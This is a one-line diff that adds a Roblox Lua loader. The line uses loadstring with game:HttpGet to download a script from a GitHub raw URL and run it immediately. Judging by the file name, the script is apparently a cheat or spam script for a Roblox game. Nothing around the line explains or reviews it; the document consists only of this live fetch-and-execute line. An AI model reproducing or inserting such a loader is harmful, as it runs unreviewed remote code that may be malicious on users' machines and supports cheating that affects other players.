@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/zombies-bloxstrike-spam3-i25uj9h0kjd6i8.lua"))()
